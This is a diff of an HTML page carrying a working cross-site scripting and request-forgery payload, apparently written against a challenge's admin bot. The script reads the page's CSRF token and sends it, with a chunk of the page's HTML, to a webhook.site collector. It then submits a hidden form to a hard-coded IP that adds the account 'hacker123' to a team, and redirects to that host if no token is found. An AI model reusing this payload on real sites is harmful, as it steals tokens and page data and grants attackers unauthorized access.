@@ -1,8 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <!-- Dummy form to keep bot happy -->
+  <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/hacker123" method="POST">
+    <input type="hidden" name="csrfToken" id="csrfTokenInput">
+    <input type="submit" id="installbutton" value="Install">
+  </form>
   <script>
-    // Send CSRF token to webhook
+    // Function to send webhook notification
     function sendWebhook(status, details) {
       fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
         method: 'POST',
@@ -13,23 +18,26 @@
       .catch(err => console.error('Webhook Error:', err.message));
     }
 
+    // Log script start
+    sendWebhook('info', 'XSS script started');
+
     try {
-      // Try to access the dashboard's CSRF token
+      // Try to access CSRF token directly (in case bot loads dashboard)
       const csrfToken = document.querySelector('input[name="csrfToken"]')?.value || 'not found';
-      sendWebhook('xss', `CSRF token: ${csrfToken}`);
-      // Optionally, submit form if token is found
+      const documentData = document.documentElement.innerHTML.substring(0, 1000); // Limit size
+      sendWebhook('xss', `CSRF token: ${csrfToken}, Document data: ${documentData}`);
+
+      // If token found, attempt form submission
       if (csrfToken !== 'not found') {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'http://52.47.161.102:3000/api/teams/1/addUser/hacker123';
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'csrfToken';
-        input.value = csrfToken;
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
+        document.getElementById('csrfTokenInput').value = csrfToken;
+        document.getElementById('exploitForm').submit();
         sendWebhook('success', 'Form submitted with CSRF token');
+      }
+
+      // Fallback: Redirect to dashboard to capture data
+      if (csrfToken === 'not found') {
+        const returnUrl = window.location.href;
+        window.location.href = 'http://52.47.161.102:3000/?return=' + encodeURIComponent(returnUrl);
       }
     } catch (err) {
       sendWebhook('failed', 'XSS error: ' + err.message);
